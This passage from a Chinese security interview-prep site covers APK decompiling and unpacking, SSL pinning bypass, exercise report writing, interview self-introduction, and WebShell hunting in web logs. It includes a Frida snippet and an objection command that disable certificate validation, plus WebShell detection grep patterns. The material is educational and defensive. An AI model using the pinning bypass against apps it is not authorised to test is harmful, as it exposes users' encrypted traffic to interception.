+- <strong>反编译流程</strong>：
+  1. <code>apktool d target.apk</code> → 得到 smali 代码、资源。
+  2. <code>jadx-gui target.apk</code> → 反编译 Java 源码。
+  3. <code>unzip</code> 解压查看 assets/lib/META-INF。
+- <strong>代码保护（加固）方案</strong>：
+  - <strong>混淆</strong>（ProGuard/R8）：类名/方法名替换，逆向难度↑。
+  - <strong>字符串加密</strong>：关键字符串加密存储（XOR/AES）。
+  - <strong>DEX 加密/壳</strong>（梆梆/360/爱加密/腾讯乐固）：DEX 加密，运行时动态解密。
+  - <strong>VMP/DexProtect</strong>：将 Java/Kotlin 编译为自定义字节码 + 虚拟机执行。
+  - <strong>Native 化</strong>：核心逻辑移到 C/C++（IDA 反编译看）。
+  - <strong>JS/H5 化</strong>：逻辑放前端（WebView 加载 JS）。
+  - <strong>签名校验</strong>：防二次打包。
+- <strong>对抗方法</strong>：
+  - <strong>脱壳</strong>：
+    - <strong>DEX Dump</strong>：Hook <code>DexFile.loadDex</code>、Hook <code>ClassLoader.loadClass</code>，dump 内存中的完整 DEX。
+    - <strong>Xposed/Frida Hook</strong> 壳的解密函数（不同加固厂商不同）。
+    - <strong>FART</strong>（基于 ART 的脱壳）。
+  - <strong>反混淆</strong>：JEB Pro 手动重命名、关键函数追踪（Hook + 调用栈）、字符串解密（运行时 Hook 拿到明文）。
+  - <strong>Native 分析</strong>：IDA Pro/Ghidra + Frida Hook（看输入输出）。
+  - <strong>Web/H5 化</strong>：Chrome 远程调试 / Charles 抓包。
+<strong>解析</strong>：考察移动逆向基础。易错点：只说 apktool。面试官想听到：能区分反编译（资源/源码）和脱壳（DEX 还原）、了解 VMP/Native 化加固对抗思路、知道 Frida Hook 在脱壳中的作用。
+<strong>考察知识点</strong>：反编译工具链（apktool/jadx/JEB）、加固方案（混淆/DEX 加密/VMP/Native 化）、脱壳思路（Hook DexFile.loadDex + 内存 dump）、Frida 在脱壳中的作用、签名校验防二次打包。<strong>→ 详见《面试精华宝典》精讲第 51 题</strong>。</p>
+<h3 id="day-79-app-ssl-pinning">Day 79 ｜ ★★★ App 抓包方法与 SSL Pinning 绕过<a class="headerlink" href="#day-79-app-ssl-pinning" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：如何对 Android App 抓包？遇到 SSL Pinning 怎么办？
+<strong>答案</strong>：
+- <strong>抓包工具</strong>：<strong>Charles / Fiddler</strong>（HTTP/HTTPS 抓包，需安装证书）、<strong>Burp Suite</strong>（渗透测试标配）、<strong>mitmproxy</strong>（命令行可脚本化）、<strong>tcpdump/Wireshark</strong>（底层抓包，绕证书）、<strong>Packet Capture</strong>（Android，免 root VPN 抓包）。
+- <strong>抓包前提</strong>：
+  - <strong>绕过证书校验</strong>：App 默认信任系统证书，但部分只信任自有证书（SSL Pinning）。
+  - <strong>绕过代理检测</strong>：部分 App 检测 Wi-Fi 代理设置。
+- <strong>证书安装</strong>：
+  - <strong>系统证书</strong>（Android 7+）：用户安装的证书不被信任（networkSecurityConfig 默认）。
+  - <strong>Magisk + MagiskTrustUserCerts</strong>：把用户证书移到系统证书。
+  - <strong>Frida/Objection 注入</strong>：把 Burp 证书安装到应用私有目录。
+- <strong>SSL Pinning 绕过方法</strong>：
+  1. <strong>Frida + objection</strong>：<code>objection -g com.target.app explore</code> → <code>android sslpinning disable</code>。
+  2. <strong>Frida 自定义脚本</strong>（objection 失败时）：
+     <div class="language-javascript highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">TrustManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;com.android.org.conscrypt.TrustManagerImpl&#39;</span><span class="p">);</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">  </span><span class="nx">TrustManager</span><span class="p">.</span><span class="nx">verifyChain</span><span class="p">.</span><span class="nx">implementation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="p">[];</span><span class="w"> </span><span class="p">};</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="p">});</span>
+</span></code></pre></div>
+  3. <strong>Xposed + JustTrustMe</strong>：Hook 所有证书校验类（TrustManagerFactory/X509TrustManager/HostnameVerifier/OkHostnameVerifier）。
+  4. <strong>Hook OkHttp 3.x</strong>：<code>okhttp3.CertificatePinner.check</code> 直接返回 true。
+  5. <strong>Native Hook</strong>：Hook <code>libssl.so</code> 的 <code>SSL_CTX_set_verify</code> 不验证。
+  6. <strong>逆向去除校验</strong>：直接修改 smali/二进制，去除证书校验代码。
+  7. <strong>重打包</strong>：修改 AndroidManifest.xml + 重新签名。
+- <strong>HTTPS 单向 vs 双向认证</strong>：
+  - 单向：客户端校验服务端证书（App 默认）。
+  - 双向：服务端也校验客户端证书（更高安全性，反编译找证书）。
+- <strong>iOS 抓包</strong>：<strong>Charles/Proxyman + 描述文件</strong>、<strong>frida-iOS-dump</strong>（Hook + 脱壳）、<strong>Stream</strong>（iOS 14+ 抓包，免越狱）。
+<strong>解析</strong>：考察移动安全实操。易错点：只说装证书。面试官想听到：能讲清 Android 7+ 用户证书失效、知道 Frida + objection 一键绕过、明白 OkHttp 单独 Hook、知道双向认证需要逆向找客户端证书。
+<strong>考察知识点</strong>：抓包工具链（Charles/Burp/mitmproxy/tcpdump）、Android 7+ 用户证书失效 + Magisk 修复、SSL Pinning 绕过（Frida/Objection/Xposed/Native Hook）、OkHttp CertificatePinner 单独 Hook、HTTPS 双向认证（客户端证书）。<strong>→ 详见《面试精华宝典》精讲第 52 题</strong>。</p>
+<h3 id="day-80">Day 80 ｜ ★★★ 护网行动报告撰写要点与汇报技巧<a class="headerlink" href="#day-80" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：护网行动报告如何撰写？汇报有什么技巧？
+<strong>答案</strong>：
+- <strong>报告结构</strong>：
+  1. <strong>概述</strong>：项目背景（客户/目标/时间/范围/授权）、团队组成（红蓝分工）。
+  2. <strong>攻击方总结</strong>：外网突破路径、内网横向路径、最终得分靶标、关键时间节点。
+  3. <strong>防守方总结</strong>：监测告警数量、响应时效（首次告警→处置完成时长）、溯源反制成果。
+  4. <strong>漏洞清单</strong>（按 CVSS 3.1 评分）：漏洞名、危害、复现步骤、影响资产、修复建议、复测结果。
+  5. <strong>关键事件</strong>：高危事件时间线（发现→确认→处置→关闭）。
+  6. <strong>加固建议</strong>：短期（紧急补丁）+ 中期（架构调整）+ 长期（持续运营）。
+  7. <strong>附件</strong>：截图、流量样本、漏洞 PoC、复现视频。
+- <strong>撰写要点</strong>：
+  - <strong>量化数据</strong>：扫描 N 个资产、发现 N 个漏洞、阻断 N 次攻击、溯源 N 个攻击者。
+  - <strong>时间轴</strong>：每个事件精确到分钟，便于复盘。
+  - <strong>风险评级</strong>：CVSS 评分 + 业务影响（结合客户业务给权重）。
+  - <strong>可视化</strong>：时间线图、攻击拓扑图、统计图表。
+  - <strong>可执行修复</strong>：补丁版本号 / 配置命令 / 厂商工单号。
+- <strong>汇报技巧</strong>：
+  - <strong>PPT 大纲</strong>：背景 → 战果 → 关键漏洞 → 加固建议 → 致谢。
+  - <strong>讲故事</strong>：开场讲一个具体攻击链案例（从邮件钓鱼到域控），比堆数据更生动。
+  - <strong>金句</strong>：用一句话总结工作亮点（"发现并阻止 17 起境外 APT 攻击"）。
+  - <strong>预判问题</strong>：评委常问"如果再给 X 时间你会做什么"——答"自动化剧本 + 零信任落地"。
+  - <strong>避免</strong>：过度技术细节（评审不全是技术）、模糊数字（"很多""大量"→ 用具体数）、推卸责任。
+- <strong>模板</strong>：OWASP 安全报告模板、PTES 报告模板、NIST 安全评估模板。
+<strong>解析</strong>：考察沟通与汇报能力（实战加分项）。易错点：只列漏洞不说业务影响。面试官想听到：能讲清报告 7 段结构、量化数据 + 时间线、明白讲故事比堆数据更有效。
+<strong>考察知识点</strong>：报告 7 段结构（概述/红队/蓝队/漏洞/事件/加固/附件）、CVSS 评分 + 业务影响加权、PPT 大纲与讲故事技巧、量化指标与时间线。<strong>→ 详见《面试精华宝典》精讲第 55 题</strong>。</p>
+<h3 id="day-81">Day 81 ｜ ★★★ 安全岗位面试自我介绍与职业规划<a class="headerlink" href="#day-81" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：面试时如何自我介绍？职业规划怎么讲？
+<strong>答案</strong>：
+- <strong>自我介绍结构</strong>（2-3 分钟）：
+  1. <strong>基本信息</strong>：姓名、学校、专业、工作年限。
+  2. <strong>核心能力</strong>：3-5 个关键技能（如渗透测试 / 应急响应 / 代码审计）。
+  3. <strong>项目经验</strong>：2-3 个代表作（项目名 + 角色 + 量化成果）。
+  4. <strong>证书 / 培训</strong>：CISP-PTE / OSCP / RHCE 等。
+  5. <strong>求职意向</strong>：方向（红队 / 应用安全 / 安全运营）+ 加入动机（业务/团队/技术栈）。
+- <strong>示例</strong>：</p>
+<blockquote>
+<p>"您好，我叫张三，毕业于 XX 大学信息安全专业，有 3 年安全行业经验。过去主要做 <strong>渗透测试与红队评估</strong>，参与过 5+ 甲方项目，发现过 <strong>Log4Shell、Spring4Shell</strong> 等重大漏洞。工具链熟悉 <strong>Burp + MSF + Cobalt Strike + Python</strong>。上一份工作负责某互联网公司 200+ 业务系统的安全评估，建立了内部 SRC 运营流程。这份简历有 <strong>CISP-PTE、OSCP</strong> 证书。这次求职希望深耕 <strong>红队/应用安全</strong> 方向，希望能加入贵司的安全研究团队。"
+- <strong>职业规划模板</strong>：
+  - <strong>1 年</strong>：融入团队 + 熟悉业务。
+  - <strong>3 年</strong>：成为某方向专家（如红队 / 应急响应 / 数据安全）。
+  - <strong>5 年</strong>：带小团队 + 主导项目。
+  - <strong>10 年</strong>：技术总监 / CSO / 创业者。
+- <strong>高频问题应对</strong>：
+  - <strong>"你的缺点"</strong>：答"过度技术细节，有时影响项目效率。学习用 OKR 设优先级"。
+  - <strong>"为什么离职"</strong>：答"寻求更大平台 / 更深技术栈"（避免负面）。
+  - <strong>"期望薪资"</strong>：反问"贵司该岗位预算范围" + "我目前 XX，期待 XX"。
+  - <strong>"没有某经验"</strong>：答"我具备 XX 核心能力 + 计划 1-3 个月达到团队平均"。
+- <strong>避免</strong>：流水账读简历、过度谦虚/过度自信、贬低前公司、离题（讲技术细节不归题）。
+<strong>解析</strong>：考察表达与自我认知。易错点：流水账介绍。面试官想听到：能用项目+数据说话、有清晰职业路径、对岗位有认知。
+<strong>考察知识点</strong>：自我介绍 5 段（基本信息/能力/项目/证书/意向）、STAR-L 法则讲故事、职业规划 1/3/5/10 年模板、高频问题应对（缺点/离职/薪资/经验不足）。<strong>→ 详见《面试精华宝典》精讲第 56 题</strong>。</p>
+</blockquote>
+<h3 id="day-82-web-webshell">Day 82 ｜ ★★★ Web 日志分析定位 WebShell 与入侵痕迹<a class="headerlink" href="#day-82-web-webshell" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：Web 日志分析如何定位 WebShell 与入侵痕迹？
+<strong>答案</strong>：
+- <strong>日志来源</strong>：
+  - <strong>Web 访问日志</strong>（Nginx/Apache/IIS）：<code>access.log</code>（默认）+ <code>error.log</code>。
+  - <strong>WAF 日志</strong>：拦截的恶意请求。
+  - <strong>应用日志</strong>：业务日志（登录/支付/上传）。
+  - <strong>中间件日志</strong>：Tomcat/Catalina.out、WebLogic server.log。
+- <strong>WebShell 上传痕迹识别</strong>：
+  - 异常 POST 请求（大量 + 大文件）。
+  - 上传路径含 <code>upload/</code>、<code>/tmp/</code>、<code>/var/www/</code> 等可写目录。
+  - 文件名异常：<code>shell.php</code>、<code>cmd.jsp</code>、<code>xxx.php.bak</code>。
+  - 上传时间与工作时间不符（非业务时段）。
+  - 同一 IP 短时间内多次上传/失败。
+- <strong>WebShell 访问痕迹识别</strong>：
+  - 访问 <code>*.php</code>、<code>*.jsp</code>、<code>*.aspx</code> 时长异常（0.001s 返回，可能 webshell 本身无操作）。
+  - 访问 URL 含 <code>?cmd=</code>、<code>?id=</code>、<code>?exec=</code>、<code>@eval(base64_decode(...))</code>。
+  - HTTP 状态码异常：大量 200 但响应大小极小。
+  - Referer/UA 异常：<code>python-requests</code>、<code>curl</code>、<code>wget</code>、<code>sqlmap</code>、<code>nmap</code>。
+  - 同一会话高频访问（心跳特征）。
+- <strong>入侵路径还原</strong>：
+  - <strong>时间线</strong>：首个异常请求 → 上传请求 → 首次访问 webshell → 提权命令 → 横向移动。
+  - <strong>攻击者画像</strong>：IP、UA、工具特征（sqlmap/awvs/burp）。
+  - <strong>关联日志</strong>：WAF 拦截记录、SSH 登录日志、计划任务变更、进程创建。
+- <strong>常用命令</strong>（Linux）：
+  - <code>awk '{print $1}' access.log | sort | uniq -c | sort -rn | head</code> —— 访问 IP 统计。
+  - <code>grep "POST" access.log | grep -i ".php" | grep -v "upload/"</code> —— 异常 POST。
+  - <code>grep -E "(\.php\?|eval|base64_decode|system\()" access.log</code> —— 可疑 URL。
+  - <code>grep "200" access.log | awk '$NF &lt; 100 {print}'</code> —— 小响应大小（webshell 探测）。
+- <strong>工具</strong>：GoAccess（实时分析）、LogParser（IIS）、Splunk/ELK（集中分析）、Chainsaw/Hayabusa（Windows 事件）。
+- <strong>深度取证</strong>：
+  - 比对基线文件（找新增 webshell）。
+  - Web 目录文件 hash（inotifywait 监控变更）。
+  - 内存马检测（Java Filter/Servlet 注册）。
+<strong>解析</strong>：考察应急响应实战能力。易错点：只看 access.log 不看 error.log/WAF 日志。面试官想听到：能讲清 WebShell 时间线还原、熟悉常用 grep/awk 命令、明白内存马需要进程/类加载分析。
+<strong>考察知识点</strong>：WebShell 上传/访问特征识别（POST/路径/UA/响应大小）、时间线还原与攻击者画像、Linux grep/awk 日志分析命令、工具链（GoAccess/Splunk/ELK）、内存马与 webshell 双轨检测。<strong>→ 详见《面试精华宝典》精讲第 54 题</strong>。</p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+    
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="September 21, 2026 20:06:58 UTC"><span class="timeago" datetime="2026-09-21T20:06:58+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="September 21, 2026 20:06:58 UTC">2026-09-21</span>
+  </span>
+
+    
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Created">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="September 21, 2026 20:06:58 UTC"><span class="timeago" datetime="2026-09-21T20:06:58+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="September 21, 2026 20:06:58 UTC">2026-09-21</span>
+  </span>
+
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      © 2026 青春沙盒 - 记录技术，也记录青春
+    </div>
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/ethicalpaws" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://twitter.com/ethicalpaws" target="_blank" rel="noopener" title="Twitter" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.indexes", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "toc.follow"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../../js/timeago.min.js"></script>
+      
+        <script src="../../../../js/timeago_mkdocs_material.js"></script>
+      
+        <script src="../../../../assets/js/extra.js"></script>
+      
+        <script src="../../../../assets/js/encryption.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+      
+        <script src="../../../../asserts/js/hacker-theme.js"></script>
+      
+    
+  </body>
+</html>
